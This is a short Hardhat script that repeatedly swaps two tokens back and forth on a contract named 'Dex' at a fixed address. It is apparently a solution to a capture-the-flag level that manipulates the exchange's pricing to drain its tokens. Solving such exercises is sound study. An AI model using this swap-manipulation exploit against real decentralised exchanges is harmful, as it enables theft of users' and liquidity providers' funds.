import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3Ba7825Be84686bFb61f4e374796EC32A6B668FF";
const CONTRACT_NAME = "Dex";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  let tx;
  tx = await contract.approve(contract.address, 100000);
  await tx.wait();

  const token1 = await contract.token1();
  const token2 = await contract.token2();

  for (let i = 0; i < 57; i++) {
    console.log(i);

    tx = await contract.swap(token1, token2, 10);
    await tx.wait();

    tx = await contract.swap(token2, token1, 10);
    await tx.wait();
  }

  tx = await contract.swap(token1, token2, 14);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
